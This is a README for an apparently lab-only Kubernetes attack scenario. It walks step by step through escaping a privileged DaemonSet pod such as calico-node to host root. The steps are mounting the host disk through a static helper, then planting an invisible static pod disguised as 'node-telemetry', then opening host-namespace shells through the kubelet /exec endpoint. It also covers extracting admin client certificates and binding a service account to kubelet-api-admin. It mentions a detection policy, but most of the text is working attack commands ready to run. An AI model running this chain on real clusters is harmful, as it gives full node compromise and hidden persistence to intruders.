# Privileged DaemonSet container escape

> **Disclaimer.** Authorized security research/testing only. This gives root
> on the host filesystem of the node where the target pod runs. Run it **only**
> on a lab cluster you own.

## Starting point — what you already have

This scenario assumes the attacker has **already obtained a foothold with
`exec` rights into a pod on the node**, i.e. one of:

- a cluster-admin kubeconfig (`admin.conf`) → `kubectl exec` into anything, or
- **any** ServiceAccount / user credential that grants
  `pods/exec` (create/exec) + `pods` get on the target pod, or
- an existing compromised workload with a remote shell (reverse shell, the
  DirtyFrag/CopyFail payload from `../exploit/`, a web RCE, etc.).

From there the goal is to go **out of the single pod** → host root. You do
**not** need host access, host PID, or any node credential at the start — the
whole point is that `exec`-level access is enough when the pod is privileged.

## Tested on

- OS: Ubuntu 22.04.5 LTS, x86_64
- Kernel: `5.15.0-173-generic`
- Kubernetes: `v1.28.15` (kubeadm, control-plane `k8s-master22`)
- Container runtime: containerd `1.7.27`
- Target checked: `calico-node` (privileged + hostNetwork DaemonSet)

## What this targets

Any workload that runs `privileged: true` on every node. Everything here was
verified against **calico-node**, but the exact same chain works on the same
class of pods — **not Calico-specific**:

- **CNI agents**: calico-node, kube-flannel, cilium, antrea, ovn-kubernetes, weave
- **Service layer**: kube-proxy (though it has a shell + busybox)
- **Storage / CSI**: rook-ceph agents, CSI node plugins, longhorn
- **Observability / security agents**: Falco, Sysdig, Datadog, Fluent Bit, custom telemetry

Pick whichever exists on **your** cluster — the only requirement is that the
pod is privileged (or `CAP_SYS_ADMIN` + device access).

## How it works

A privileged pod on the node can mount the host root disk and `chroot` into
it — instantly "root on the host filesystem". Many of these agent images
ship **no `mount`, `tar`, or `chmod`** binaries, so the escape walks the
generic path with a tiny static helper:

1. upload a **static mount helper** (`mnt`, mount-only syscall wrapper),
2. `mnt mount /dev/vda1 /mnt` + `chroot` → host filesystem root,
3. write a `node-telemetry.yaml` static pod (privileged + hostPID + hostNetwork)
   into `/etc/kubernetes/manifests/` under a **nonexistent namespace** →
   kubelet runs it but the API never mirrors it — an **invisible pod**.

The final pod shares the host PID/network/UTS namespaces, so a shell inside it
is a full host shell (`nsenter -t 1 -a`).

**Two escape levels** (don't conflate them):

- **Level 1 — filesystem** (steps 1–3): `mount` + `chroot` into the host root
  disk. Arbitrary file read/write on the node, still in the pod's
  mount/pid/net namespaces.
- **Level 2 — process/network** (steps 4–6): an invisible `hostPID` +
  `hostNetwork` static pod, then `nsenter -t 1 -a`. Host PID/network/mount
  namespaces — full node compromise.

## Prereqs

Everything runs from an **attacker box** that has `kubectl` access to your lab
cluster. Check it all before starting:

```sh
# 1. tools on your box: kubectl, jq (for the pod finder), gcc (for the static
#    helper), base64 + curl (for the kubelet /pods step)
command -v kubectl jq gcc base64 curl

# 2. cluster reachable + your credential really has the foothold
export KUBECONFIG=/path/admin.conf   # or any kubeconfig with pods/exec
kubectl cluster-info
kubectl auth can-i create pods/exec -n kube-system   # adjust ns to your target; must print "yes"
```

**3. Credential for the kubelet API** (`:10250` — steps 5-6 use it; plain
`pods/exec` is NOT enough there). Pick one:

```sh
# Option A — client cert from a kubeconfig (e.g. admin.conf):
kubectl config view --raw --minify -o jsonpath='{.users[0].user.client-certificate-data}' | base64 -d > client.crt
kubectl config view --raw --minify -o jsonpath='{.users[0].user.client-key-data}'     | base64 -d > client.key

# Option B — ServiceAccount token (no certs to extract; your kubeconfig user
# may be "token" instead of "client-certificate-data"):
TOKEN=$(kubectl create token <sa> -n <ns> --duration=6h)
#   the SA must be allowed to reach the kubelet first — without that, bind it:
kubectl create clusterrolebinding kubelet-token:kubelet-admin \
  --clusterrole=system:kubelet-api-admin --serviceaccount=<ns>:<sa>
#   then the same TOKEN works for BOTH :10250/pods and :10250/exec:
#   curl -sk -H "Authorization: Bearer $TOKEN" https://<NODE_IP>:10250/pods
```

Option A is what the commands below show; for Option B swap `--cert/--key`
for `-H "Authorization: Bearer $TOKEN"` (curl) or `--token "$TOKEN"`
(`kubelet-exec.py`).

The static `mnt` helper is compiled on **your** box, then uploaded into the
pod — the pod image does not need a toolchain.

## How to use

**0. Find your target** (a privileged pod on a node)

```sh
# verify your foothold first:
kubectl auth can-i create pods/exec -n <ns>      # must be yes
bash ../find-privileged-pods.sh          # prints ns/pod/privileged/hostPID/hostNetwork
POD=...                                 # pick any row with privileged=true
```

The steps below use `calico-node` as the concrete example — substitute your
own `$POD`.

**1. Build the static mount helper**

```sh
cd helpers && make         # produces ./mnt
```

**2. Upload it into the target pod** (agent images usually lack `tar`)

```sh
kubectl -n kube-system exec -i ${POD#*/} -- sh -c 'cat > /tmp/mnt' < mnt
```

**3. Mount the host disk + chroot** (no `mount`/`chmod` in the image → coreutils)

First discover the host root **device** — the single most cluster-dependent
step. `lsblk` exists in some images; `/proc/partitions` always does (columns:
major minor #blocks name):

```sh
kubectl -n kube-system exec -i ${POD#*/} -- /bin/bash -c '
lsblk 2>/dev/null || cat /proc/partitions
'
# Pick the OS disk — usually the largest partition: vda1 / sda1 / nvme0n1p1
DEV=/dev/vda1
```

Then mount it and chroot (`$DEV` is expanded on your box, not in the pod):

```sh
kubectl -n kube-system exec -i ${POD#*/} -- /bin/bash -c "
/usr/bin/coreutils --coreutils-prog=chmod 700 /tmp/mnt
/tmp/mnt mount $DEV /mnt
/usr/bin/coreutils --coreutils-prog=chroot /mnt /bin/bash
"
# root on the HOST filesystem now:
hostname                      # still the POD name (UTS ns is not shared) — not host proof
grep PRETTY /etc/os-release   # real host OS (host /etc, not the image's)
ls /var/lib/kubelet /root     # host-only paths
```

> **Verify step 3 worked:** the os-release line is the **host's** (e.g.
> `Ubuntu 22.04.5 LTS`), not the agent image's, and `/var/lib/kubelet` exists.
> If `mount` failed, relist `/proc/partitions` to pick the right `$DEV`, then
> rerun only the mount+chroot block.

> **Level 1 complete** — this is a *filesystem* breakout: you can read/write
> anything on the node's root disk (secrets, SA tokens, `/root`, other pods'
> storage), but you are still in the mount namespace of the escaped pod. **Level 2**
> (step 6) is the *process/network* escape into the host namespaces.

> If the image already has `mount` (e.g. kube-proxy busybox), skip the helper:
> `mount /dev/vda1 /mnt` then `chroot /mnt /bin/sh`.

**4. Drop the invisible static pod**

Still inside the chroot mount (`/mnt` = host root), write the manifest under
the **nonexistent namespace** so the API mirror is rejected (kubelet still
runs the container):

```sh
kubectl -n kube-system exec -i ${POD#*/} -- /bin/bash -c \
  'cat > /mnt/etc/kubernetes/manifests/node-telemetry.yaml' \
  < manifests/node-telemetry.yaml
# kubelet watches the dir and starts it within ~1s
```

> **Verify step 4 worked:** the file is on the host disk:
> `kubectl -n kube-system exec ${POD#*/} -- ls -l /mnt/etc/kubernetes/manifests/node-telemetry.yaml`

> **Offline cluster?** The manifest uses `ubuntu:22.04`. If your node cannot
> pull it, pre-pull once on every node:
> `kubectl -n kube-system exec ${POD#*/} -- sh -c 'ctr -n k8s.io images pull docker.io/library/ubuntu:22.04'`
> (or swap the `image:` for an image that is already cached on the node).

**5. Verify it's invisible**

```sh
# kubelet sees it running (the only place it shows):
curl -sk --cert client.crt --key client.key \
  https://<NODE_IP>:10250/pods | grep telemetry         # present, running
#   ...or with a ServiceAccount token instead of certs:
#   curl -sk -H "Authorization: Bearer $TOKEN" https://<NODE_IP>:10250/pods | grep telemetry

# the cluster API does NOT:
kubectl get pods -A | grep telemetry                    # nothing
```

> **Verify step 5 worked:** the kubelet output shows a `node-telemetry`
> container in `Running`, while `kubectl get pods -A` shows **nothing** — the
> pod runs on the node but has no API object.

**6. (Optional) full escape — shell in the invisible pod**

The pod runs `hostPID` + `hostNetwork` + `privileged`. It has no `kubectl
exec` (no API object) — reach it via the **kubelet `/exec`** endpoint on
`:10250` (SPDY/WebSocket, not plain HTTP). Two options — **Option A (curl)
needs no extra tools**, Option B is for interactive shells.

**Option A — plain curl** (one-shot commands only; output includes WebSocket
channel bytes). Works with certs or a bearer token:

```sh
curl -sk --http1.1 -N --cert client.crt --key client.key \
  -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Protocol: v4.channel.k8s.io" \
  "https://<NODE_IP>:10250/exec/kube-node-telemetry/node-telemetry-<NODE_HOSTNAME>/agent?command=/bin/hostname&input=1&output=1&error=1"
# ~ stdout frame carries: k8s-worker22
# replace --cert/--key with -H "Authorization: Bearer $TOKEN" for SA-token auth
```

One-shot host escape with curl only:

```sh
curl -sk --http1.1 -N --cert client.crt --key client.key \
  -H "Upgrade: websocket" -H "Connection: Upgrade" \
  -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
  -H "Sec-WebSocket-Protocol: v4.channel.k8s.io" \
  "https://<NODE_IP>:10250/exec/kube-node-telemetry/node-telemetry-<NODE_HOSTNAME>/agent?command=/usr/bin/nsenter&command=-t&command=1&command=-a&command=/bin/bash&command=-c&command=hostname&input=1&output=1&error=1"
# ~ full host shell for this command (prints the host's hostname)
```

**Option B — bundled `kubelet-exec.py`** (interactive shells, read/respond
stdin). It needs the `websockets` Python package — on Ubuntu/Debian that
means a venv first (system `pip` is externally-managed / PEP 668):

```sh
# one-time setup in the scenario dir:
python3 -m venv .venv && .venv/bin/pip install websockets
#   or, if you prefer: pip install --break-system-packages websockets

# root shell in the invisible pod:
.venv/bin/python kubelet-exec.py \
  --client-cert client.crt --client-key client.key \
  <NODE_IP> kube-node-telemetry node-telemetry-<NODE_HOSTNAME> agent \
  -- /bin/bash -c 'hostname; id'

# same, authenticating with a ServiceAccount token (no certs):
.venv/bin/python kubelet-exec.py --token "$TOKEN" \
  <NODE_IP> kube-node-telemetry node-telemetry-<NODE_HOSTNAME> agent \
  -- /bin/bash -c 'hostname; id'
```

Then jump into the host namespaces:

```sh
.venv/bin/python kubelet-exec.py \
  --client-cert client.crt --client-key client.key \
  <NODE_IP> kube-node-telemetry node-telemetry-<NODE_HOSTNAME> agent \
  -- /bin/bash -c 'nsenter -t 1 -a bash'
# full host shell now
```

> **Note:** a direct kubelet `/exec` needs *kubelet-authorization* — the
> `pods/exec` verb alone is not enough (that only covers kubectl's path via
> the API server). Either the node's admin client cert or an SA bound to
> `system:kubelet-api-admin` is required (see prereqs option B).

> **Level 2 complete** — you now sit in the host PID/network/mount namespaces:
> see every node process (`ps auxf`), sniff host traffic (`tcpdump -i any`),
> and edit any file. This is the kill-chain endpoint the detector is
> instrumented to catch.

> These exact `mount` + `/etc/kubernetes/manifests` writes are what the
> `container-escape-detection` TracingPolicy in
> `../../policy/container-escape-detection.yaml` was tuned for — replay this
> path and watch the host-disk mount and the static-pod write light up as
> `process_kprobe` events, while the `chroot`/`nsenter` invocations show up
> as `process_exec` events (kubectl-exec audit dashboard 20189).

## Cleanup

```sh
rm /etc/kubernetes/manifests/node-telemetry.yaml
/tmp/mnt umount /dev/<DEVICE> /mnt
```

## Files

- `helpers/` — `mnt.c` (static mount/umount syscall wrapper) + `Makefile`
- `manifests/node-telemetry.yaml` — the invisible static-pod manifest
- `kubelet-exec.py` — WebSocket client for the kubelet `/exec` endpoint (Level 2, Option B)
- `../find-privileged-pods.sh` — discover the target on any cluster

### `kubelet-exec.py` — requirements & usage

- **File:** `kubelet-exec.py` (ships with this scenario).
- **Python:** 3.8+; package `websockets` (install per step 6 Option B: venv
  or `--break-system-packages`).
- **Credentials:** either `--client-cert client.crt --client-key client.key`
  (kubelet admin cert, prereqs option A) or `--token "$TOKEN"` (SA bound to
  `system:kubelet-api-admin`, prereqs option B). The same argument as step-5
  auth, one of the two is required.
- **Usage:**
  ```
  python kubelet-exec.py [--client-cert FILE --client-key FILE | --token TOKEN] \
      <NODE_IP> <NAMESPACE> <POD> <CONTAINER> -- <command> [args...]
  ```
- **Notes:** `<POD>` is the mirrored name, `node-telemetry-<NODE_HOSTNAME>`.
  `<NAMESPACE>` is the manifest's namespace (`kube-node-telemetry`), not a
  real API namespace. Run `.venv/bin/python kubelet-exec.py` if you set up a
  venv. Output mixes WebSocket channel bytes only when using plain curl;
  this helper strips them.

### Reference

- [Secure Kubernetes Blind Spots (Döring)](https://securekubernetes.com) — privileged-container breakout family
- [KubeCon "Attacking and Defending Kubernetes" mention / hacktricks container escape](https://book.hacktricks.xyz)